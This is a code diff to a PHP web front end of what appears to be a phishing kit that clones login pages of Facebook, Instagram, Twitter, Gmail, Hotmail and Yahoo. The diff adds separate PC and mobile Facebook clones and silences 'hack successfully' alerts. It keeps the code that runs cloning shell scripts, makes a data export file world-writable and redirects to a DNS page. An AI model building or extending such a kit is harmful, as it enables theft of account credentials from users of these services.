@@ -146,13 +146,14 @@ readonly required>
   </form>
     </div>
 
+      <br>
 
      <div align="center"> 
       <h3> <font color="black"> Or she used a ready </font> </h3>
      </div>
 
 
-         <br>
+         <br><br>
 
 
 
@@ -161,10 +162,11 @@ readonly required>
    <select name="site_ready" id="select_site" onchange="this.form.submit()">
     <option selected disabled> Ready websites </option>
      <optgroup label="Social Media">
-    <option value ="https://www.facebook.com"> Facebook </option>
-    <option value ="https://www.instagram.com"> Instagram </option>
-    <option value ="https://www.twitter.com"> Twitter </option>
-      </optgroup>
+      <option value ="https://www.facebook.com_pc"> Facebook (PC) </option>
+      <option value ="https://www.facebook.com_tablet_mobile"> Facebook (tablet - mobile) </option>
+      <option value ="https://www.instagram.com"> Instagram </option>
+      <option value ="https://www.twitter.com"> Twitter </option>
+     </optgroup>
 
      <option disabled> </option>
 
@@ -181,10 +183,13 @@ readonly required>
   
     
 
-  <div id="footer">
+
+<!--
+    <div id="footer">
    <img src="/css/clone_diagram.jpg" height="250" width="600">
-   </div>
-   
+    </div> 
+  -->
+  
 
 
 
@@ -279,8 +284,8 @@ readonly required>
   file_put_contents($path_to_file,$file_contents);
 
 
-  echo '<script type="text/javascript">alert("The website hack successfully");
-         </script>';
+//  echo '<script type="text/javascript">alert("The website hack successfully");
+     //    </script>';
           echo ("<script>location.href='dns.php'</script>");
 
           } // end of parity ip
@@ -298,8 +303,8 @@ readonly required>
 
    else if (filter_var($ip_addr, FILTER_VALIDATE_IP) != true)
      {
-echo '<script type="text/javascript">alert("The website hack fail: Try again");
-         </script>';
+//echo '<script type="text/javascript">alert("The website hack fail: Try again");
+         //</script>';
      echo ("<script>location.href='index.php'</script>");
       }   
 
@@ -331,20 +336,39 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
       chmod("/var/www/clonenew/export/data.txt", 0777);
 
 
-    if ($site_ready=='https://www.facebook.com')
+
+    if ($site_ready=='https://www.facebook.com_pc')
        {
 
     shell_exec('shell/./permissions.sh');
-    shell_exec('shell/./facebook.sh');
+    shell_exec('shell/./facebook_pc.sh');
 
 
 
-    echo '<script type="text/javascript">alert("Facebook hack successfully");
-      </script>';
+   // echo '<script type="text/javascript">alert("Facebook for PC hack successfully");
+    //  </script>';
      echo ("<script>location.href='dns.php'</script>");
      
 
-    } // end if of facebook
+    } // end if of facebook pc
+
+
+
+  else if ($site_ready=='https://www.facebook.com_tablet_mobile')
+        {
+
+    shell_exec('shell/./permissions.sh');
+    shell_exec('shell/./facebook_tablet_mobile.sh');
+
+
+
+    //echo '<script type="text/javascript">alert("Facebook for tablet - mobile hack successfully");
+     // </script>';
+     echo ("<script>location.href='dns.php'</script>");
+     
+
+    } // end if of facebook tablet - mobile
+
 
 
 
@@ -356,8 +380,8 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
 
 
-    echo '<script type="text/javascript">alert("Instagram hack successfully");
-      </script>';
+    //echo '<script type="text/javascript">alert("Instagram hack successfully");
+     // </script>';
      echo ("<script>location.href='dns.php'</script>");
      
 
@@ -373,8 +397,8 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
 
 
-    echo '<script type="text/javascript">alert("Twitter hack successfully");
-      </script>';
+   // echo '<script type="text/javascript">alert("Twitter hack successfully");
+     // </script>';
      echo ("<script>location.href='dns.php'</script>");
      
 
@@ -392,8 +416,8 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
 
 
-    echo '<script type="text/javascript">alert("Gmail hack successfully");
-      </script>';
+   // echo '<script type="text/javascript">alert("Gmail hack successfully");
+     // </script>';
      echo ("<script>location.href='dns.php'</script>");
      
 
@@ -410,8 +434,8 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
 
 
-    echo '<script type="text/javascript">alert("Hotmail hack successfully");
-      </script>';
+   // echo '<script type="text/javascript">alert("Hotmail hack successfully");
+     // </script>';
      echo ("<script>location.href='dns.php'</script>");
      
 
@@ -430,8 +454,8 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
 
 
-    echo '<script type="text/javascript">alert("Yahoo hack successfully");
-      </script>';
+   // echo '<script type="text/javascript">alert("Yahoo hack successfully");
+     // </script>';
      echo ("<script>location.href='dns.php'</script>");
      
 
